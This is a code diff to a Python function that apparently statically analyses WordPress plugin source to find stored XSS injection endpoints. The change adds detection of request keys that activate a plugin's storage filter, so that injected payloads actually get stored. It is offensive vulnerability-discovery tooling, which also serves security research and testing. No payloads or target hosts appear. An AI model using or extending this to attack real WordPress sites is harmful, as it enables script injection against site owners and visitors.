@@ -1794,13 +1794,45 @@ def find_stored_xss_endpoint(local_path: str) -> Optional[dict]:
                     if _B64_PAT.search(_otext2):
                         payload_transform = "base64"
                         break
+            # Detectar params de activacion: algunos plugins comprueban un key adicional
+            # (p.ej. 'wp_statistics_hit_rest') en $_REQUEST para activar el filtro que
+            # decodifica page_uri; sin ese key el payload nunca se almacena.
+            # Patron: static $<var> = '<key>' + isset($_REQUEST[self::$<var>]) gateando
+            # add_filter() en el constructor (no en logica de exclusion).
+            _ACT_STATIC_RE = re.compile(
+                r"static\s+\$(\w+)\s*=\s*['\"]([A-Za-z0-9_]{3,60})['\"]"
+            )
+            # Solo activar cuando el isset esta directamente junto a add_filter/add_action
+            # o dentro de la definicion de is_rest_hit() — no en logica de exclusion
+            _REST_HIT_GATE_RE = re.compile(
+                r"isset\s*\(\s*\$_REQUEST\s*\[\s*self::\$[A-Za-z_]+\s*\]"
+            )
+            activation_params: dict = {}
+            for _afp, _atext in all_texts.items():
+                # Buscar gating key: static $key_var = 'key_name' + isset($_REQUEST[self::$key_var])
+                if _REST_HIT_GATE_RE.search(_atext):
+                    for vm in _ACT_STATIC_RE.finditer(_atext):
+                        var_name, key_val = vm.group(1), vm.group(2)
+                        # Confirmar que self::$var_name aparece en el isset
+                        if re.search(rf"self::\${re.escape(var_name)}", _atext):
+                            activation_params[key_val] = "1"
+                # Buscar current_page_type / current_page_id si se pasan como params del filtro
+                if (re.search(r"current_page_type", _atext) and
+                        re.search(r"add_filter\s*\(", _atext)):
+                    activation_params.setdefault("current_page_type", "home")
+                    activation_params.setdefault("current_page_id", "0")
+            # Merge rest_params: activation_params primero (base), luego rest_params (incluye inject_param)
+            merged_params = list(activation_params.keys()) + [
+                p for p in rest_params if p not in activation_params
+            ]
             best_inject = {
                 "action": None,
                 "inject_param": inject_param,
                 "table_hint": table_hint,
                 "fp": fp,
                 "rest_endpoint": rest_endpoint,
-                "rest_params": rest_params,
+                "rest_params": merged_params,
+                "activation_params": activation_params,
                 "payload_transform": payload_transform,
             }
             break
@@ -1856,11 +1888,13 @@ def find_stored_xss_endpoint(local_path: str) -> Optional[dict]:
                     break
         if not view_path:
             view_path = "/wp-admin/admin.php"
+        _act_p = best_inject.get("activation_params", {})
         return {
             "inject_action": None,
             "inject_endpoint": best_inject["rest_endpoint"],
             "inject_params_all": best_inject.get("rest_params", []),
             "inject_param": best_inject["inject_param"],
+            "inject_base_params": _act_p,  # params fijos que activan el hook
             "table_hint": best_inject["table_hint"],
             "view_path": view_path,
             "http_method": "GET",
